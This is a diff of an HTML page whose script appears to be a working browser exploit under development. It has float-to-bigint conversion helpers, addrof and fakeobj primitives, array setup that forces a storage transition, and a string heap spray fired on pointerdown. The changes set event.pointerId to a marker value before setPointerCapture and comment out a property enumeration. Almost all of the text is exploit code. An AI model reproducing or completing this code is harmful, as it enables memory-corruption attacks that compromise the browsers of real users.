@@ -2,7 +2,7 @@
 	<body></body>
 <pre id='log' style="font-size : 40px;"></pre>
 <script>
-	let keep = [];
+	var keep = [];
 	function float2bigint(v) {
   f[0] = v;
   return BigInt(u[0]) | (BigInt(u[1]) << 32n);
@@ -14,7 +14,7 @@ function bigint2float(v) {
 }
 let addrof = null
 let fakeobj = null;
-for (var i = 0; i < 100; i++) keep.push([1.1*i]);
+for (var i = 0; i < 100; i++) { keep.push([1.1*i]);}
 let a0 = [0,0,0,0,0,0,0,0,0,0];
 let a1 = [0,0,0,0,0,0,0,0,0,0];
 // transition to unboxed double storage
@@ -104,9 +104,10 @@ setTimeout(() => {
     
   document.addEventListener('pointerdown', (event) => {
     sprayStringImpl(0, 10000);
+	event.pointerId = 0x4141414141;
     document.body.setPointerCapture(event.pointerId);
     
-    var arr_str = Object.getOwnPropertyNames(g_obj_str);
+    //var arr_str = Object.getOwnPropertyNames(g_obj_str);
 	  /*
     for (let i = arr_str.length - 1; i > 0; i--) {
         if (arr_str[i].length > 0xff) {
